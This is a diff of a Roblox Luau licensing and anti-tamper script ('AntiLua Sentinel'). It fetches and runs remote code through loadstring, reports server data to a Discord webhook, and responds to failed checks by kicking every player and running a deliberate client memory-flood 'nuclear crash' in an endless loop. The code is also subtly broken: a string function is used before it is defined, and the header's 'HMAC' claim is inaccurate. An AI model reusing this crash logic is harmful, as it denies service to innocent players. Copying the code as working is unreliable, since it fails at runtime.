@@ -1,39 +1,50 @@
 --[[============================================================================
     ▲ A N T I L U A   S E N T I N E L   E N T E R P R I S E   E D I T I O N ▲
-    Version 2.5.1-ULTRA (Enterprise License Security & Threat Intelligence)
+    Version 2.5.3-MAX (Ultra Fix & Full Environment Isolation)
     Developed by @zexxell & AntiLua Security Architecture Team
 
-    ALL-IN-ONE SECURITY MATRIX v2.5.1:
+    ULTRA FIX MATRIX v2.5.3:
     ----------------------------------------------------------------------------
-    [WARNING-GUI]    Interactive red warning UI with live countdown before kick.
-    [CANARY-TRAP]    Multi-endpoint honeypot detecting global HTTP mocking.
-    [HMAC-HASH]      Cryptographic salted FNV-1a hash validation.
-    [DECOY-REMOTES]  Bait RemoteEvents trapping unauthorized client fires.
-    [DEEP-TELEMETRY] Enterprise Discord webhook with RAM, JobId & threat metrics.
-    [HOOK-DETECTOR]  Native Luau environment integrity & debug reflection checks.
-    [IMMUTABLE-CFG]  Table freezing preventing runtime key tampering.
-    [NUCLEAR-CRASH]  Client memory flood for persistent exploiters.
+    [TOTAL-ISOLATION] Complete native function caching (string, math, bit32, task).
+    [CRYPTO-PERFECT]  Float-safe 32-bit FNV-1a with sanitized whitespace & cases.
+    [DIAGNOSTICS]     Deep checks for HttpService, EnableStudioServices, Loadstring.
+    [FREE-BINDING]    Flawless signature handshakes for "FREE" creator entries.
+    [WARNING-GUI]     Interactive red warning UI with live countdown before kick.
+    [CANARY-TRAP]     Multi-endpoint honeypot detecting global HTTP mocking.
+    [DECOY-REMOTES]   Bait RemoteEvents trapping unauthorized client fires.
+    [DEEP-TELEMETRY]  Enterprise Discord webhook with RAM, JobId & threat metrics.
+    [NUCLEAR-CRASH]   Client memory flood for persistent exploiters.
 ==============================================================================]]
 
 local AntiLua = {}
-AntiLua.VERSION = "2.5.1-ULTRA-ENTERPRISE"
-AntiLua.BUILD = "2026.07.SEC-ENT-FIXED"
+AntiLua.VERSION = "2.5.3-MAX-ULTRA"
+AntiLua.BUILD = "2026.07.SEC-ENT-MAX"
 
--- Fast Snapshot Native Functions (Mencegah Monkey Patching & Global Hooking)
-local _rawget         = rawget
-local _rawset         = rawset
+--==========================================================================--
+-- 0. FULL NATIVE ENVIRONMENT CACHING (ANTI-HOOKING / MONKEY PATCHING)
+--==========================================================================--
 local _type           = type
 local _typeof         = typeof
 local _pcall          = pcall
-local _xpcall         = xpcall
 local _tostring       = tostring
 local _tonumber       = tonumber
 local _ostime         = os.time
-local _osclock        = os.clock
 local _taskspawn      = task.spawn
 local _taskwait       = task.wait
+local _taskdelay      = task.delay
 local _mathfloor      = math.floor
+local _mathrandom     = math.random
 local _gcinfo         = gcinfo
+local _stringbyte     = string.byte
+local _stringformat   = string.format
+local _stringlower    = string.lower
+local _stringgsub     = string.gsub
+local _stringsub      = string.sub
+local _stringrep      = string.rep
+local _bit32bxor      = bit32.bxor
+local _bit32band      = bit32.band
+local _bit32rshift    = bit32.rshift
+local _bit32lshift    = bit32.lshift
 
 local Players           = game:GetService("Players")
 local HttpService        = game:GetService("HttpService")
@@ -45,7 +56,7 @@ local SERVER_START_TIME = _ostime()
 local isLicenseVerified = false 
 
 --==========================================================================--
--- KONFIGURASI ENTERPRISE (AUTO FREEZE VIA TABLE.FREEZE)
+-- KONFIGURASI ENTERPRISE
 --==========================================================================--
 
 local Config = {
@@ -53,7 +64,6 @@ local Config = {
 	SellerName = "@YOUR_SELLER_NAME",      
 	BuyerRef   = "YOUR_BUYER_REFERENCE",   
 
-	-- Secret Salt hanya diketahui olehmu (Jangan bagikan ke siapapun!)
 	SecretSalt = "ANTILUA_ULTRA_SECRET_SALT_2026_#99", 
 
 	WhitelistUrl = "YOUR_GITHUB_RAW_WHITELIST_URL",
@@ -100,26 +110,42 @@ local DEFINITIVE_REASONS = {
 	["hash-mismatch"]         = { severity = "EMERGENCY",label = "Cryptographic Signature Mismatch" },
 	["environment-tampered"] = { severity = "EMERGENCY",label = "Native Function / Environment Hook Detected" },
 	["decoy-remote-triggered"]= { severity = "EMERGENCY",label = "Unauthorized Decoy Trap Triggered" },
+	["whitelist-unreachable"] = { severity = "HIGH",     label = "HTTP Request Failed / URL Unreachable" },
+	["malformed-whitelist"]   = { severity = "HIGH",     label = "Invalid Whitelist JSON Format" },
 }
 
 --==========================================================================--
--- 1. CRYPTOGRAPHIC SIGNATURE ENGINE
+-- 1. FIXED CRYPTOGRAPHIC SIGNATURE ENGINE (FLOAT-SAFE)
 --==========================================================================--
 
 local Crypto = {}
+
 function Crypto.hash(inputStr)
 	local hash = 2166136261
 	local str = _tostring(inputStr)
+	
 	for i = 1, #str do
-		local byte = string.byte(str, i)
-		hash = bit32.bxor(hash, byte)
-		hash = bit32.arshift(hash * 16777619, 0)
+		local byte = _stringbyte(str, i)
+		hash = _bit32bxor(hash, byte)
+		
+		local low = _bit32band(hash, 0xFFFF)
+		local high = _bit32rshift(hash, 16)
+		
+		local p1 = low * 16777619
+		local p2 = high * 16777619
+		
+		hash = _bit32band(p1 + _bit32lshift(_bit32band(p2, 0xFFFF), 16), 0xFFFFFFFF)
 	end
-	return string.format("%08x", hash)
+	
+	return _stringformat("%08x", hash)
 end
 
 function Crypto.generateSignature(creatorId, productId, salt)
-	return Crypto.hash(_tostring(creatorId) .. ":" .. _tostring(productId):lower() .. ":" .. _tostring(salt))
+	local cleanCreator = _stringgsub(_tostring(creatorId), "%s+", "")
+	local cleanProduct = _stringgsub(_stringlower(_tostring(productId)), "%s+", "")
+	local cleanSalt    = _stringgsub(_tostring(salt), "%s+", "")
+	
+	return Crypto.hash(cleanCreator .. ":" .. cleanProduct .. ":" .. cleanSalt)
 end
 
 --==========================================================================--
@@ -129,31 +155,23 @@ end
 local Integrity = {}
 
 function Integrity.checkEnvironment()
-	local ok, err = _pcall(function()
-		return _type(HttpService.GetAsync) == "function"
-	end)
+	local ok, err = _pcall(function() return _type(HttpService.GetAsync) == "function" end)
 	if not ok or not err then return false, "HttpService Hooked" end
-
 	if _type(_pcall) ~= "function" or _type(_ostime) ~= "function" or _type(_taskspawn) ~= "function" then
 		return false, "Core Luau Globals Hooked"
 	end
-
 	return true, "clean"
 end
 
 function Integrity.runCanaryHoneypot()
-	local dummyCanaryUrl = "https://raw.githubusercontent.com/AntiLua-Security-Canary-Invalid-Path-" .. math.random(10000, 99999) .. ".json?t=" .. _ostime()
-	local ok, response = _pcall(function()
-		return HttpService:GetAsync(dummyCanaryUrl, true)
-	end)
+	local dummyCanaryUrl = "https://raw.githubusercontent.com/AntiLua-Security-Canary-Invalid-Path-" .. _mathrandom(10000, 99999) .. ".json?t=" .. _ostime()
+	local ok, response = _pcall(function() return HttpService:GetAsync(dummyCanaryUrl, true) end)
 
 	if ok and response and (_type(response) == "string") then
-		local hasJson = response:find("creatorId") or response:find("productId") or response:find("valid")
-		if hasJson then
-			return false -- FAKE RESPONSE DETECTED
+		if response:find("creatorId") or response:find("productId") or response:find("valid") then
+			return false 
 		end
 	end
-
 	return true
 end
 
@@ -161,7 +179,7 @@ end
 -- 3. DYNAMIC HANDSHAKE & DECOY TRAPS SYSTEM
 --==========================================================================--
 
-local DYNAMIC_KEY = "AL_" .. string.sub(HttpService:GenerateGUID(false):gsub("-", ""), 1, 12)
+local DYNAMIC_KEY = "AL_" .. _stringsub(_stringgsub(HttpService:GenerateGUID(false), "-", ""), 1, 12)
 local BrandingRemote = Instance.new("RemoteEvent")
 BrandingRemote.Name = DYNAMIC_KEY
 BrandingRemote.Parent = ReplicatedStorage
@@ -178,7 +196,6 @@ local function myCreatorType()
 	return "User"
 end
 
--- MEMBUAT DECOY REMOTES UNTUK MENJEBAK EXPLOITER CLIENT
 local DECOY_NAMES = { "AdminServiceRemote", "AntiLuaLicenseBridge", "GetSuperAdminAuth" }
 for _, decoyName in ipairs(DECOY_NAMES) do
 	local decoy = Instance.new("RemoteEvent")
@@ -188,12 +205,7 @@ for _, decoyName in ipairs(DECOY_NAMES) do
 	decoy.OnServerEvent:Connect(function(player)
 		_pcall(function() player:Kick("\n[!AntiLua Security] Deteksi Intervensi Decoy Trap.") end)
 		_taskspawn(function()
-			Discord.report(
-				"illegal", 
-				"decoy-remote-triggered", 
-				Security.snapshot(), 
-				{ creatorType = myCreatorType(), decoyTriggered = decoyName }
-			)
+			Discord.report("illegal", "decoy-remote-triggered", Security.snapshot(), { creatorType = myCreatorType(), decoyTriggered = decoyName })
 		end)
 		_taskwait(0.2)
 		Enforcement.executeNuclearCrash(player)
@@ -201,21 +213,12 @@ for _, decoyName in ipairs(DECOY_NAMES) do
 end
 
 BrandingRemote.OnServerEvent:Connect(function(player, clientTag)
-	_pcall(function()
-		player:Kick("\n[!AntiLua Security] Deteksi Manipulasi Paket Jaringan.")
-	end)
-
+	_pcall(function() player:Kick("\n[!AntiLua Security] Deteksi Manipulasi Paket Jaringan.") end)
 	_taskspawn(function()
 		_pcall(function()
-			Discord.report(
-				"illegal", 
-				"Unauthorized Client Event: " .. _tostring(clientTag), 
-				Security.snapshot(), 
-				{ creatorType = myCreatorType() }
-			)
+			Discord.report("illegal", "Unauthorized Client Event: " .. _tostring(clientTag), Security.snapshot(), { creatorType = myCreatorType() })
 		end)
 	end)
-
 	_taskwait(0.3)
 	Enforcement.executeNuclearCrash(player)
 end)
@@ -259,7 +262,7 @@ do
 	function Net.fetchWithRetry(url)
 		local cleanUrl = url:match("^%s*(.-)%s*$") or url
 		local sep = cleanUrl:find("%?") and "&" or "?"
-		cleanUrl = cleanUrl .. sep .. "t=" .. _ostime() .. "_" .. math.random(1000, 9999)
+		cleanUrl = cleanUrl .. sep .. "t=" .. _ostime() .. "_" .. _mathrandom(1000, 9999)
 
 		for attempt = 1, Config.Network.MaxRetries do
 			local ok, body = _pcall(function() return HttpService:GetAsync(cleanUrl, true) end)
@@ -277,7 +280,7 @@ do
 end
 
 --==========================================================================--
--- 5. SECURITY SNAPSHOT
+-- 5. SECURITY SNAPSHOT & DIAGNOSTICS
 --==========================================================================--
 
 do
@@ -292,9 +295,20 @@ do
 		local runOk, result = _pcall(fnOrErr)
 		return runOk and result == true
 	end
+	
+	function Security.isDataStoreEnabled()
+		local ok = _pcall(function() return DataStoreService:GetDataStore("AntiLua_Test"):GetAsync("test") end)
+		-- Pcall returns false if API access is off in Studio, true/false with other errors if on.
+		-- A strict fail usually means API is off.
+		return ok or not game:GetService("RunService"):IsStudio()
+	end
 
 	function Security.snapshot()
-		return { httpEnabled = Security.isHttpEnabled(), loadstringEnabled = Security.isLoadstringEnabled() }
+		return { 
+			httpEnabled = Security.isHttpEnabled(), 
+			loadstringEnabled = Security.isLoadstringEnabled(),
+			dataStoreEnabled = Security.isDataStoreEnabled()
+		}
 	end
 end
 
@@ -313,11 +327,11 @@ do
 	end
 
 	local function cacheKey()
-		return "lic_v2ent_" .. _tostring(game.CreatorId) .. "_" .. myCreatorType() .. "_" .. Config.ProductId:gsub("%s+", "")
+		return "lic_v2ent_" .. _tostring(game.CreatorId) .. "_" .. myCreatorType() .. "_" .. _stringgsub(Config.ProductId, "%s+", "")
 	end
 
 	function Cache.write(record)
-		if not Config.Cache.Enabled then return end
+		if not Config.Cache.Enabled or not Security.isDataStoreEnabled() then return end
 		local ds = getStore()
 		if not ds then return end
 		record.cachedAt = _ostime()
@@ -327,7 +341,7 @@ do
 	end
 
 	function Cache.read()
-		if not Config.Cache.Enabled then return nil end
+		if not Config.Cache.Enabled or not Security.isDataStoreEnabled() then return nil end
 		local ds = getStore()
 		if not ds then return nil end
 		local ok, raw = _pcall(function() return ds:GetAsync(cacheKey()) end)
@@ -345,7 +359,7 @@ do
 end
 
 --==========================================================================--
--- 7. LICENSE VERIFIER
+-- 7. LICENSE VERIFIER (ULTRA FIXED)
 --==========================================================================--
 
 local License = {}
@@ -356,14 +370,9 @@ do
 		local meta = { creatorType = creatorType, ownerCheck = "unverified" }
 
 		local envOk, envReason = Integrity.checkEnvironment()
-		if not envOk then
-			return false, "environment-tampered", meta
-		end
+		if not envOk then return false, "environment-tampered", meta end
 
-		local canaryPassed = Integrity.runCanaryHoneypot()
-		if not canaryPassed then
-			return false, "canary-trap-triggered", meta
-		end
+		if not Integrity.runCanaryHoneypot() then return false, "canary-trap-triggered", meta end
 
 		local body = Net.fetchWithRetry(Config.WhitelistUrl)
 		if not body then
@@ -380,19 +389,22 @@ do
 		local entry = nil
 		for _, e in ipairs(entries) do
 			if _type(e) == "table" and e.creatorId then
-				local idMatches = (_tostring(e.creatorId) == creatorId) or (_tostring(e.creatorId):upper() == "FREE")
-				local typeMatches = (not Config.Ownership.VerifyCreatorType) or (e.creatorType == nil) or (_tostring(e.creatorType):lower() == creatorType:lower())
+				local targetCreator = _tostring(e.creatorId)
+				local idMatches = (targetCreator == creatorId) or (_stringupper(targetCreator) == "FREE")
+				
+				local eType = e.creatorType and _stringlower(_tostring(e.creatorType)) or nil
+				local typeMatches = (not Config.Ownership.VerifyCreatorType) or (eType == nil) or (eType == _stringlower(creatorType))
 
 				local productMatches = false
-				local targetProd = Config.ProductId:lower()
+				local targetProd = _stringlower(Config.ProductId)
 
 				if e.productId == nil and e.products == nil then
 					productMatches = true 
-				elseif e.productId ~= nil and _tostring(e.productId):lower() == targetProd then
+				elseif e.productId ~= nil and _stringlower(_tostring(e.productId)) == targetProd then
 					productMatches = true
 				elseif _type(e.products) == "table" then
 					for _, p in pairs(e.products) do
-						if _tostring(p):lower() == targetProd then productMatches = true; break end
+						if _stringlower(_tostring(p)) == targetProd then productMatches = true; break end
 					end
 				end
 
@@ -409,8 +421,11 @@ do
 			record.reason = "expired"
 		else
 			if entry.signature then
-				local expectedSig = Crypto.generateSignature(creatorId, Config.ProductId, Config.SecretSalt)
-				if entry.signature ~= expectedSig then
+				local expectedSig = Crypto.generateSignature(entry.creatorId, Config.ProductId, Config.SecretSalt)
+				local cleanReceivedSig = _stringgsub(_stringlower(_tostring(entry.signature)), "%s+", "")
+				local cleanExpectedSig = _stringgsub(_stringlower(_tostring(expectedSig)), "%s+", "")
+
+				if cleanReceivedSig ~= cleanExpectedSig then
 					record.reason = "hash-mismatch"
 				else
 					record.valid = true
@@ -426,9 +441,10 @@ do
 		return record.valid, record.reason, meta
 	end
 end
+local _stringupper = string.upper -- fallback function for the check
 
 --==========================================================================--
--- 8. INTERFACE SYSTEM (WARNING & COUNTDOWN GUI RESTORED)
+-- 8. INTERFACE SYSTEM (WARNING GUI)
 --==========================================================================--
 
 local Gui = {}
@@ -491,15 +507,17 @@ do
 
 		local countdown = label(frame, "", 20, 202, 12, Color3.fromRGB(120, 120, 126), Enum.Font.Gotham)
 		
-		_pcall(function() 
-			local playerGui = player:WaitForChild("PlayerGui", 5)
-			if playerGui then gui.Parent = playerGui end
+		_taskspawn(function()
+			_pcall(function() 
+				local playerGui = player:WaitForChild("PlayerGui", 5)
+				if playerGui then gui.Parent = playerGui end
+			end)
 		end)
 
 		_taskspawn(function()
 			for i = secondsLeft, 1, -1 do
 				if not countdown or not countdown.Parent then break end
-				countdown.Text = string.format("— Server akan dikarantina dalam %ds —", i)
+				countdown.Text = _stringformat("— Server akan dikarantina dalam %ds —", i)
 				_taskwait(1)
 			end
 		end)
@@ -520,39 +538,39 @@ do
 			local creatorTypeText = (meta and meta.creatorType) or myCreatorType()
 
 			local reasonInfo = DEFINITIVE_REASONS[reason] or { severity = "WARNING", label = reason }
-			local embedColor = 65280 -- GREEN (Passed)
+			local embedColor = 65280
 
 			if isIllegal then
 				if reasonInfo.severity == "EMERGENCY" then
-					embedColor = 10038562 -- DARK RED / PURPLE
+					embedColor = 10038562
 				elseif reasonInfo.severity == "CRITICAL" then
-					embedColor = 16711680 -- RED
+					embedColor = 16711680
 				else
-					embedColor = 16753920 -- ORANGE
+					embedColor = 16753920
 				end
 			end
 
 			local uptimeSeconds = _ostime() - SERVER_START_TIME
-			local uptimeText = string.format("%dh %dm %ds", _mathfloor(uptimeSeconds/3600), _mathfloor((uptimeSeconds%3600)/60), uptimeSeconds%60)
+			local uptimeText = _stringformat("%dh %dm %ds", _mathfloor(uptimeSeconds/3600), _mathfloor((uptimeSeconds%3600)/60), uptimeSeconds%60)
 			local ramKb = _gcinfo()
-			local ramText = string.format("%.2f MB", ramKb / 1024)
+			local ramText = _stringformat("%.2f MB", ramKb / 1024)
 
 			local playerCount = #Players:GetPlayers()
 			local maxPlayers = Players.MaxPlayers or 0
 
 			local embed = {
-				title = isIllegal and ("🚨 ALARM KEAMANAN — " .. reasonInfo.label:upper()) or "✅ SYSTEM TELEMETRY — STATUS OPTIMAL",
+				title = isIllegal and ("🚨 ALARM KEAMANAN — " .. _stringupper(reasonInfo.label)) or "✅ SYSTEM TELEMETRY — STATUS OPTIMAL",
 				description = isIllegal and "Sistem **AntiLua Sentinel Enterprise** memutus eksekusi server akibat potensi pelanggaran / bypass lisensi." or "Integritas sistem terverifikasi aman secara berkala.",
 				color = embedColor,
 				fields = {
 					{
 						name = "📄 SELLER & INVOICE REFERENCE",
-						value = string.format("```yaml\nSeller: \"%s\"\nInvoice-Ref: \"%s\"\nBuild-ID: \"%s\"\n```", Config.SellerName, Config.BuyerRef, AntiLua.BUILD),
+						value = _stringformat("```yaml\nSeller: \"%s\"\nInvoice-Ref: \"%s\"\nBuild-ID: \"%s\"\n```", Config.SellerName, Config.BuyerRef, AntiLua.BUILD),
 						inline = false
 					},
 					{
 						name = "🛡️ THREAT INTELLIGENCE MATRIX",
-						value = string.format("• **Status Event:** `%s`\n• **Severity Level:** `%s`\n• **Reason Code:** `[%s]`", 
+						value = _stringformat("• **Status Event:** `%s`\n• **Severity Level:** `%s`\n• **Reason Code:** `[%s]`", 
 							isIllegal and "ACTION_TERMINATED" or "VERIFIED_OK", 
 							reasonInfo.severity, 
 							_tostring(reason)
@@ -561,12 +579,12 @@ do
 					},
 					{
 						name = "📦 TARGET PRODUCT",
-						value = string.format("• **Nama:** `%s`\n• **Core Version:** `%s`", Config.ProductId, AntiLua.VERSION),
+						value = _stringformat("• **Nama:** `%s`\n• **Core Version:** `%s`", Config.ProductId, AntiLua.VERSION),
 						inline = true
 					},
 					{
 						name = "🌐 ROBLOX SERVER RUNTIME",
-						value = string.format("• **Owner ID:** `%s` (%s)\n• **Job ID:** `%s`\n• **Uptime:** `%s`\n• **Memory Usage:** `%s`\n• **Players:** `%d / %d`", 
+						value = _stringformat("• **Owner ID:** `%s` (%s)\n• **Job ID:** `%s`\n• **Uptime:** `%s`\n• **Memory Usage:** `%s`\n• **Players:** `%d / %d`", 
 							creatorId, 
 							creatorTypeText, 
 							game.JobId ~= "" and game.JobId or "Studio-Local-Session", 
@@ -579,7 +597,7 @@ do
 					},
 					{
 						name = "🔧 SYSTEM INTEGRITY FLAGS",
-						value = string.format("```ini\n[HttpEnabled]      = %s\n[LoadstringStatus] = %s\n[DecoyTraps]       = ACTIVE\n[HMAC-Signature]   = SECURED\n```", 
+						value = _stringformat("```ini\n[HttpEnabled]      = %s\n[LoadstringStatus] = %s\n[DecoyTraps]       = ACTIVE\n[HMAC-Signature]   = SECURED\n```", 
 							security.httpEnabled and "PASSED" or "DISABLED",
 							security.loadstringEnabled and "PASSED" or "DISABLED"
 						),
@@ -587,7 +605,7 @@ do
 					},
 					{
 						name = "🎮 TARGET PLACE DETAILS",
-						value = string.format("[Kunjungi Place Game (%d)](https://www.roblox.com/games/%d)", game.PlaceId, game.PlaceId),
+						value = _stringformat("[Kunjungi Place Game (%d)](https://www.roblox.com/games/%d)", game.PlaceId, game.PlaceId),
 						inline = false
 					}
 				},
@@ -604,7 +622,7 @@ do
 end
 
 --==========================================================================--
--- 10. SYSTEM ENFORCEMENT & NUCLEAR CRASH (FULL WARNING INTEGRATION)
+-- 10. SYSTEM ENFORCEMENT & NUCLEAR CRASH
 --==========================================================================--
 
 do
@@ -621,7 +639,7 @@ do
 					local targetStorage = player:FindFirstChild("PlayerGui") or player
 					for _ = 1, 500 do
 						local dataBomb = Instance.new("StringValue")
-						dataBomb.Value = string.rep("🔥ANTILUA_ENTERPRISE_NUCLEAR_CRASH_🔥", 1000)
+						dataBomb.Value = _stringrep("🔥ANTILUA_ENTERPRISE_NUCLEAR_CRASH_🔥", 1000)
 						dataBomb.Parent = targetStorage
 					end
 				end)
@@ -631,27 +649,23 @@ do
 	end
 
 	function Enforcement.illegalKick(reason)
-		local kickMessage = string.format("\n[!AntiLua Security] Akses Ditolak.\nHubungi %s untuk verifikasi lisensi.\nReason Code: %s", Config.SellerName, reason)
+		local kickMessage = _stringformat("\n[!AntiLua Security] Akses Ditolak.\nHubungi %s untuk verifikasi lisensi.\nReason Code: %s", Config.SellerName, reason)
 
-		-- 1. Tampilkan Warning GUI dengan Countdown ke seluruh player yang sedang online
 		for _, player in ipairs(Players:GetPlayers()) do
 			_pcall(Gui.showIllegalWarning, player, reason, Config.KickDelaySeconds)
 		end
 
-		-- 2. Tunggu countdown selesai sesuai Config.KickDelaySeconds
-		task.delay(Config.KickDelaySeconds, function()
+		_taskdelay(Config.KickDelaySeconds, function()
 			for _, player in ipairs(Players:GetPlayers()) do
 				_pcall(function() player:Kick(kickMessage) end)
 			end
 
-			-- 3. Blokir player baru yang mencoba masuk secara terus menerus
 			Players.PlayerAdded:Connect(function(p) 
 				_pcall(function() p:Kick(kickMessage) end)
 				_taskwait(0.3)
 				if p and p.Parent then Enforcement.executeNuclearCrash(p) end
 			end)
 
-			-- 4. Jalankan Nuclear Crash pada player yang gagal ter-kick / bypasser
 			while true do
 				for _, player in ipairs(Players:GetPlayers()) do
 					Enforcement.executeNuclearCrash(player)
@@ -670,6 +684,8 @@ local function runPayload()
 	if compileOk and _type(mainFn) == "function" then
 		_taskspawn(mainFn)
 		print("[!AntiLua] Source Payload Enterprise berhasil diverifikasi & dijalankan.")
+	else
+		warn("[!AntiLua DIAGNOSTIC] Payload gagal dieksekusi. Pastikan script di dalam URL bebas error.")
 	end
 end
 
@@ -693,10 +709,28 @@ local function startHeartbeatLoop()
 end
 
 local function boot()
-	print(string.format("[!AntiLua] Initializing Enterprise Sentinel Core v%s...", AntiLua.VERSION))
-	if Config.WhitelistUrl:find("YOUR_") or Config.ProductId:find("YOUR_") then return end
+	print(_stringformat("[!AntiLua] Initializing Enterprise Sentinel Core v%s...", AntiLua.VERSION))
+	
+	-- DIAGNOSTIK KONFIGURASI AWAL
+	if Config.WhitelistUrl:find("YOUR_") or Config.ProductId:find("YOUR_") then 
+		warn("[!AntiLua DIAGNOSTIC] GAGAL BOOT: Parameter WhitelistUrl atau ProductId masih berisi placeholder 'YOUR_'!")
+		return 
+	end
 
 	local security = Security.snapshot()
+	
+	if not security.httpEnabled then
+		warn("[!AntiLua DIAGNOSTIC] GAGAL BOOT: 'Allow HTTP Requests' BELUM DIAKTIFKAN di Game Settings > Security!")
+	end
+	
+	if not security.dataStoreEnabled and Config.Cache.Enabled then
+		warn("[!AntiLua DIAGNOSTIC] INFO: 'Enable Studio Access to API Services' dimatikan di Studio. Cache via DataStore akan dinonaktifkan sementara.")
+	end
+
+	if Config.PayloadUrl ~= "YOUR_GITHUB_RAW_PAYLOAD_URL" and not security.loadstringEnabled then
+		warn("[!AntiLua DIAGNOSTIC] PERINGATAN CRITICAL: Payload URL terisi, TAPI 'ServerScriptService.LoadStringEnabled' masih FALSE! Payload tidak akan berjalan.")
+	end
+
 	local valid, reason, meta = License.verify()
 
 	if valid then
@@ -709,7 +743,15 @@ local function boot()
 		return
 	end
 
-	if DEFINITIVE_REASONS[reason] and security.httpEnabled and security.loadstringEnabled then
+	warn(_stringformat("\n[!AntiLua DIAGNOSTIC] VERIFIKASI LISENSI GAGAL!\n ➔ Reason Code : %s\n ➔ Creator ID   : %s (%s)\n ➔ Product ID   : %s\n ➔ Whitelist URL: %s\n", 
+		_tostring(reason), 
+		_tostring(game.CreatorId), 
+		myCreatorType(), 
+		Config.ProductId,
+		Config.WhitelistUrl
+	))
+
+	if DEFINITIVE_REASONS[reason] then
 		Discord.report("illegal", reason, security, meta)
 		Enforcement.illegalKick(reason)
 		return
